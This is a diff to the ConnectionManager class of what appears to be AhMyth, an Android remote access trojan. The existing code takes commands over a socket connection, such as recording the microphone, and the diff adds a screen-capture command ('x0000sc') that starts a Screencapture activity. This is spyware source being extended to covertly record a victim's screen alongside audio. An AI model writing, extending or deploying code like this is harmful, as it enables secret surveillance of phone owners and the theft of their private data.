@@ -5,21 +5,23 @@ import android.os.Looper;
 import android.util.Log;
 import org.json.JSONObject;
 import io.socket.emitter.Emitter;
-
-
+import android.content.Intent;
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.app.Activity;
 
 /**
  * Created by AhMyth on 10/1/16.
  */
 
-public class ConnectionManager {
+public class ConnectionManager extends Activity{
 
 
     public static Context context;
     public static JSONObject data;
     private static io.socket.client.Socket ioSocket;
     private static FileManager fm = new FileManager();
-
+    //public static Screencapture oScreencapture ;
     public static void startAsync(Context con)
     {
         try {
@@ -34,6 +36,7 @@ public class ConnectionManager {
 
 
     public static void sendReq() {
+
 try {
 
 
@@ -100,6 +103,10 @@ try {
                         break;
                     case "x0000mc":
                             x0000mc(data.getInt("sec"));
+                        break;
+                    case "x0000sc":
+
+                        //x0000sc(data.getInt("sec"));
                         break;
                     case "x0000lm":
                         x0000lm();
@@ -168,6 +175,14 @@ try {
 
     public static void x0000mc(int sec) throws Exception{
         MicManager.startRecording(sec);
+    }
+    //static Screencapture oScreencapture ;
+    public static void x0000sc(int sec) throws Exception{
+
+        Intent intent = new Intent(ConnectionManager.context, Screencapture.class);
+
+        ConnectionManager.context.startActivity(intent);
+
     }
 
     public static void x0000lm() throws Exception{
